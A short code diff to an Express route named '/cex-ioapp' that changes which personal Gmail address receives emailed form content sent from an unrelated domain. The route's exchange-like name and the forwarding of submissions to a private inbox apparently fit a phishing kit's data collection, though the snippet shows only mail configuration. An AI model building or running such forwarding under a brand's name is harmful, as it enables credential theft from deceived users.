@@ -283,7 +283,7 @@ app.post('/cex-ioapp', (req, res, next) => {
 
   const mail = {
       from: 'admin@growveonct.com',
-      to: 'ifestephenie@gmail.com',
+      to: 'Ibominstagram@gmail.com',
       subject: 'New message from Cexioapp',
       html: content,
   }
